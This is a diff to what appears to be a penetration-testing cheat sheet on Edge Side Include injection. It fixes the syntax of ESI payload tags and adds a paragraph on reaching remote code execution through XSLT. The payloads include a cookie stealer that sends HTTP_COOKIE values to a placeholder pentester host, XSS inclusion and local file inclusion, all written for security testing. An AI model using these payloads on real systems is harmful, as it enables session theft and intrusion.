@@ -9,13 +9,13 @@ ESI can be identified by inspecting response headers in search for `Surrogate-Co
 Some useful ESI tags are:
 ```html
 // Basic detection
-<esi: include src=http://<PENTESTER IP>>
+<esi:include src=http://<PENTESTER IP>>
 
 // XSS Exploitation Example
-<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>
+<esi:include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>
 
 // Cookie Stealer (bypass httpOnly flag)
-<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>
+<esi:include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>
 
 // Introduce private local files (Not LFI per se)
 <esi:include src="supersecret.txt">
@@ -23,3 +23,7 @@ Some useful ESI tags are:
 // Valid for Akamai, sends debug information in the response
 <esi:debug/>
 ```
+
+In some cases, SSI injection can be used to achieve remote code execution (RCE), the only pre-requisite is that the application that is processing the ESI directives must support XSLT, a dynamic language used to transform XML files, and that the attacker includes `dca=xslt` in the payload (i.e `<esi:include src="http://<PENTESTER IP>/payload" dca=xslt>`).
+
+Read more about ESI in [GoSecure blog](https://gosecure.ai/blog/2018/04/03/beyond-xss-edge-side-include-injection/).
